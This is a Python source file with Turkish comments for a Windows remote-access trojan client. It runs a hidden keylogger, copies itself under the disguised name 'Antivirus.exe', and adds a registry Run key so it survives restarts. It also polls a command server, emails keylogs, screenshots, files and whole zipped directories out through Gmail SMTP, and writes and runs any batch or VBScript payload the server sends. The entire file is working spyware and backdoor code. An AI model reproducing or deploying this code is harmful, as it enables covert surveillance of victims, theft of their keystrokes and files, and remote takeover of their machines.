import socket
import sys
import os
import time
import shutil
import winreg  # Windows Registry for startup
import threading
from pynput import keyboard  # Keylogger için
from PIL import ImageGrab  # Ekran görüntüsü almak için
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import zipfile

HOST = "127.0.0.1"
PORT = 65432
LOG_FILE = os.path.join(os.getenv("TEMP"), "keylog.txt")

# LOG_FILE dosyasının varlığını ve yazılabilirliğini kontrol et
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as log_file:
        log_file.write("")

# Keylogger fonksiyonu
def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f" [{key}] ")

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

# Windows başlangıcına ekleme fonksiyonu
def add_to_startup(file_path, reg_name):
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as reg_key:
            winreg.SetValueEx(reg_key, reg_name, 0, winreg.REG_SZ, file_path)
        print(f"[BİLGİ] Başlangıca eklendi: {file_path}")
    except Exception as e:
        print(f"[HATA] Başlangıca eklenemedi: {e}")

# Kalıcılık sağlama fonksiyonu
def ensure_persistence():
    target_dir = os.path.join(os.getenv("ProgramData"), "ClientApp")
    target_path = os.path.join(target_dir, "Antivirus.exe")

    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    current_path = os.path.abspath(sys.argv[0])

    if not os.path.exists(target_path):
        shutil.copy(current_path, target_path)
        print(f"[BİLGİ] Script {target_path} konumuna kopyalandı")

    add_to_startup(target_path, "ClientApp")

ensure_persistence()
start_keylogger()  # Keylogger'ı başlat

def create_and_execute_temp_file(content, extension):
    temp_file_path = os.path.join(os.getenv("TEMP"), f"temp_script{extension}")
    with open(temp_file_path, "w") as temp_file:
        temp_file.write(content)

    print(f"[BİLGİ] Dosya çalıştırılıyor: {temp_file_path}")
    os.system(temp_file_path)

    os.remove(temp_file_path)
    print(f"[BİLGİ] Geçici dosya silindi: {temp_file_path}")

def send_email_with_attachment(recipient_email, subject, body, attachment_path):
    sender_email = " Client'in Gmail adresi"  # Client'in Gmail adresi
    sender_password = "Client'in Gmail şifresi"  # Client'in Gmail şifresi

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject

    with open(attachment_path, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", f"attachment; filename= {os.path.basename(attachment_path)}")

    msg.attach(part)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, msg.as_string())
        print(f"[BİLGİ] E-posta gönderildi: {recipient_email}")
    except Exception as e:
        print(f"[HATA] E-posta gönderilemedi: {e}")

def take_screenshot_and_email(recipient_email):
    screenshot_path = os.path.join(os.getenv("TEMP"), "screenshot.png")
    ImageGrab.grab().save(screenshot_path)
    send_email_with_attachment(recipient_email, "Ekran Görüntüsü", "Ekran görüntüsü ektedir.", screenshot_path)
    os.remove(screenshot_path)
    print(f"[BİLGİ] Ekran görüntüsü silindi: {screenshot_path}")

def email_keylogs(recipient_email):
    send_email_with_attachment(recipient_email, "Keyloglar", "Keyloglar ektedir.", LOG_FILE)

def browse_directory_and_send(client, directory):
    try:
        if not os.path.exists(directory):
            client.sendall(f"HATA Dizin bulunamadı: {directory}".encode())
            return
        
        files = os.listdir(directory)
        file_list = "\n".join(files)
        client.sendall(f"DOSYA_LISTESI {directory}\n{file_list}".encode())
    except Exception as e:
        client.sendall(f"HATA {str(e)}".encode())

def compress_and_send_file(recipient_email, file_path):
    if not os.path.exists(file_path):
        print(f"[HATA] Dosya bulunamadı: {file_path}")
        return
    
    zip_path = os.path.join(os.getenv("TEMP"), "compressed_file.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(file_path, os.path.basename(file_path))
    
    # Ensure the file is completely zipped before sending
    if os.path.exists(zip_path):
        send_email_with_attachment(recipient_email, "Sıkıştırılmış Dosya", "Sıkıştırılmış dosya ektedir.", zip_path)
        os.remove(zip_path)
        print(f"[BİLGİ] Sıkıştırılmış dosya silindi: {zip_path}")

def compress_and_send_directory(recipient_email, directory):
    if not os.path.exists(directory):
        print(f"[HATA] Dizin bulunamadı: {directory}")
        return
    
    zip_path = os.path.join(os.getenv("TEMP"), "directory.zip")
    print(f"[BİLGİ] Dizin sıkıştırılıyor: {directory}")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, directory))
    
    # Ensure the directory is completely zipped before sending
    if os.path.exists(zip_path):
        print(f"[BİLGİ] Sıkıştırma tamamlandı: {zip_path}")
        send_email_with_attachment(recipient_email, "Dizin İçeriği", "Dizin içeriği ektedir.", zip_path)
        os.remove(zip_path)
        print(f"[BİLGİ] Sıkıştırılmış dosya silindi: {zip_path}")
    else:
        print(f"[HATA] Sıkıştırma başarısız oldu: {zip_path}")

# Sunucuya bağlanma ve gelen komutları dinleme
while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
            client.connect((HOST, PORT))
            print(f"[BİLGİ] Sunucuya bağlanıldı: {HOST}:{PORT}")

            while True:
                try:
                    data = client.recv(4096).decode()
                    if data == "GET_KEYLOG":
                        with open(LOG_FILE, "r") as log_file:
                            logs = log_file.read()
                        client.sendall(logs.encode())
                    elif data.startswith("GET_SCREENSHOT"):
                        recipient_email = data.split(" ")[1]
                        take_screenshot_and_email(recipient_email)
                    elif data.startswith("EMAIL_KEYLOG"):
                        recipient_email = data.split(" ")[1]
                        email_keylogs(recipient_email)
                    elif data.startswith("BROWSE_DIR"):
                        directory = data.split(" ", 1)[1]
                        browse_directory_and_send(client, directory)
                    elif data.startswith("SEND_FILE"):
                        parts = data.split(" ")
                        recipient_email = parts[1]
                        file_path = " ".join(parts[2:]).strip('"')
                        compress_and_send_file(recipient_email, file_path)
                    elif data.startswith("SEND_DIRECTORY"):
                        parts = data.split(" ")
                        recipient_email = parts[1]
                        directory = " ".join(parts[2:]).strip('"')
                        compress_and_send_directory(recipient_email, directory)
                    elif data.startswith("HATA"):
                        print(f"[HATA] {data}")
                    else:
                        print("[BİLGİ] Dosya içeriği alındı. Çalıştırılıyor...")
                        extension = ".bat" if data.strip().startswith("@echo") else ".vbs"
                        create_and_execute_temp_file(data, extension)
                except Exception as e:
                    print(f"[HATA] Bağlantı koptu: {e}")
                    break
    except ConnectionRefusedError:
        print("[BİLGİ] Sunucu mevcut değil. Yeniden deneniyor...")
        time.sleep(5)
